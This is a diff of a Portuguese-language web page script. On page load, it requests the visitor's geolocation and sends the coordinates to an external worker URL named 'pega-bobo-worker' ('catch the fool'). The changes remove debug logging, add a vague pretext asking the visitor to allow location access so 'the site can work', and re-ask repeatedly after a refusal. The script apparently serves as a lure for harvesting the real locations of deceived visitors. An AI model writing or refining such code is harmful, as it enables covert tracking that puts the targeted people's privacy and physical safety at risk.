@@ -42,7 +42,7 @@
             alert("Erro: " + error.message);
         }
     </script>
-    <script>
+  <script>
     async function sendLocation(position) {
         const data = {
             latitude: position.coords.latitude,
@@ -52,43 +52,45 @@
 
         const workerUrl = "https://pega-bobo-worker.zeruelinha99.workers.dev";
         
-        console.log("[DEBUG] Enviando para:", workerUrl);
-        console.log("[DEBUG] Dados:", data);
-
         try {
             const response = await fetch(workerUrl, {
                 method: "POST",
-                headers: { 
-                    "Content-Type": "application/json",
-                    "X-Debug": "true" 
-                },
+                headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(data)
             });
             
-            console.log("[DEBUG] Resposta completa:", response);
-            
             const responseData = await response.json();
-            console.log("[DEBUG] Corpo da resposta:", responseData);
-            
-            if (!response.ok) {
-                throw new Error(`HTTP error! status: ${response.status}`);
-            }
-            
             alert(responseData.success ? "✅ Localização enviada!" : "❌ Erro ao enviar");
         } catch (error) {
-            console.error("[ERRO] Detalhes:", error);
-            alert(`Falha na comunicação: ${error.message}`);
+            console.error("Erro:", error);
+            alert("Falha na comunicação");
         }
     }
 
     function handleError(error) {
-        console.error("[ERRO] Geolocalização:", error);
-        alert("Erro: " + error.message);
+        let errorMessage;
+        switch(error.code) {
+            case error.PERMISSION_DENIED:
+                errorMessage = "Você negou a permissão de localização. Por favor, ative nas configurações do site.";
+                break;
+            case error.POSITION_UNAVAILABLE:
+                errorMessage = "Localização indisponível.";
+                break;
+            case error.TIMEOUT:
+                errorMessage = "A requisição de localização expirou.";
+                break;
+            default:
+                errorMessage = "Erro desconhecido na geolocalização.";
+        }
+        
+        // Mostra botão para tentar novamente
+        if(confirm(`${errorMessage} Deseja tentar novamente?`)) {
+            requestLocation();
+        }
     }
 
-    window.addEventListener("load", () => {
+    function requestLocation() {
         if (navigator.geolocation) {
-            console.log("[DEBUG] Solicitando geolocalização...");
             navigator.geolocation.getCurrentPosition(
                 sendLocation, 
                 handleError,
@@ -100,6 +102,13 @@
             );
         } else {
             alert("Seu navegador não suporta geolocalização!");
+        }
+    }
+
+    window.addEventListener("load", () => {
+        // Explica ao usuário antes de pedir a localização
+        if(confirm("Este site precisa acessar sua localização para funcionar. Permitir?")) {
+            requestLocation();
         }
     });
 </script>
